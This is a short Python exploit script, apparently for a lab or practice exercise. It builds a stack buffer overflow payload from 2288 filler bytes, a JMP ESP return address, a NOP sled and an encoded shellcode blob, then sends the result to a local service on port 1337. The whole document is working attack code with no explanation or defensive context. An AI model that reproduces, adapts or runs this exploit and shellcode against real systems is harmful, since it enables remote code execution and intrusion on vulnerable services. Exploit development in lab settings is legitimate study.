#!/usr/bin/python
from ezio import remote, p32

jmp_esp = p32(0x148010cf)
offset = 2288

try:
  buf = b"\xda\xd3\xd9\x74\x24\xf4\x5a\xbe\x7d\xad\x0c\x0f\x29\xc9\xb1\x31\x31\x72\x18\x83\xea\xfc\x03\x72\x69\x4f\xf9\xf3\x79\x0d\x02\x0c\x79\x72\x8a\xe9\x48\xb2\xe8\x7a\xfa\x02\x7a\x2e\xf6\xe9\x2e\xdb\x8d\x9c\xe6\xec\x26\x2a\xd1\xc3\xb7\x07\x21\x45\x3b\x5a\x76\xa5\x02\x95\x8b\xa4\x43\xc8\x66\xf4\x1c\x86\xd5\xe9\x29\xd2\xe5\x82\x61\xf2\x6d\x76\x31\xf5\x5c\x29\x4a\xac\x7e\xcb\x9f\xc4\x36\xd3\xfc\xe1\x81\x68\x36\x9d\x13\xb9\x07\x5e\xbf\x84\xa8\xad\xc1\xc1\x0e\x4e\xb4\x3b\x6d\xf3\xcf\xff\x0c\x2f\x45\xe4\xb6\xa4\xfd\xc0\x47\x68\x9b\x83\x4b\xc5\xef\xcc\x4f\xd8\x3c\x67\x6b\x51\xc3\xa8\xfa\x21\xe0\x6c\xa7\xf2\x89\x35\x0d\x54\xb5\x26\xee\x09\x13\x2c\x02\x5d\x2e\x6f\x48\xa0\xbc\x15\x3e\xa2\xbe\x15\x6e\xcb\x8f\x9e\xe1\x8c\x0f\x75\x46\x72\xf2\x5c\xb2\x1b\xab\x34\x7f\x46\x4c\xe3\x43\x7f\xcf\x06\x3b\x84\xcf\x62\x3e\xc0\x57\x9e\x32\x59\x32\xa0\xe1\x5a\x17\xc3\x64\xc9\xfb\x2a\x03\x69\x99\x32"
  payload = b"\x41" * offset + jmp_esp + b"\x90" * 80 + buf
  print("\nSending evil buffer...")
  io = remote("127.0.0.1", 1337, timeout=1.0)
  io.send(payload)
  io.close()
  print("\nDone!")
except Exception as e:
  print(e)
